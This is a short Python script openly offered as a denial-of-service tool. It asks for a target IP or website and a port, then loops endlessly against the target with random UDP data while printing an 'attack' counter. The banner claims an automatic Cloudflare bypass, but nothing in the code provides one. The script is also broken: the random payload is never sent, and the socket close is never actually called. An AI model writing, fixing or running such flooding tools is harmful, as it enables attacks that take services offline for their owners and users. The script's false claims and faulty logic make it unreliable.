import os,time,socket,random,pyfiglet,colorama
from pyfiglet import Figlet
print("ver:                      1.2.00      ver 1 by:oidop group      ")
print("updated by:               oid.co                     ")
print("                  NOW WITH AUTO CLOUDFLARE BYPASS             ")
print("               NOTE:CF BYPASS ON A WEB WILL BE A TAD SLOWER                 ")
custom_fig = Figlet(font='poison')
print(custom_fig.renderText('DDOS'))
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(1490)
port=int(input("Port:"))
ipp=input("IP Address/WebSite: ")
sent = 0
print("STARTING YOUR ATTACK ENJOY =>:)<= STOP WITH CTRL+C")
while True:
    s.close
    s.connect((ipp, port))
    sent=sent+1
    print("udp=>true=>method=>NUKE~>Attack on {} <=port - {} <=ip/web - {} <=sent" .format(port,ipp,sent))
